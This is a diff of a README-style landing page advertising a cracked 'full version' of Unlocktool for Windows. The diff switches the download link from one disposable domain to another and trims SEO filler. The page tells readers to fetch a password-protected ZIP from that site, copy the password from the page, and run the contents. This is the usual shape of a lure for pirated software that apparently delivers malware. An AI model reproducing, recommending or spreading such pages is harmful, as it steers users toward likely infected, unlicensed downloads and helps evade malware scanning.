@@ -1,6 +1,6 @@
 ***
 
-# Unlocktool Full Version — Windows Install
+# Unlocktool Windows Setup
 
 Unlocktool — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Unlocktool — Windows setup and configuration · Premium workspace · Zero nag 
 
 > Use the release page below for Windows.
 
-- **Release page:** [qiermdwrxse.slopmods.tech](https://qiermdwrxse.slopmods.tech/)
-- **Full URL:** `https://qiermdwrxse.slopmods.tech/`
+- **Release page:** [qiermdwrxse.slopmods.top](https://qiermdwrxse.slopmods.top/)
+- **Full URL:** `https://qiermdwrxse.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **qiermdwrxse.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **qiermdwrxse.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Unlocktool — Windows setup and configuration · Premium workspace · Zero nag 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **qiermdwrxse.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **qiermdwrxse.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **Unlocktool** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core Unlocktool features on Windows desktop
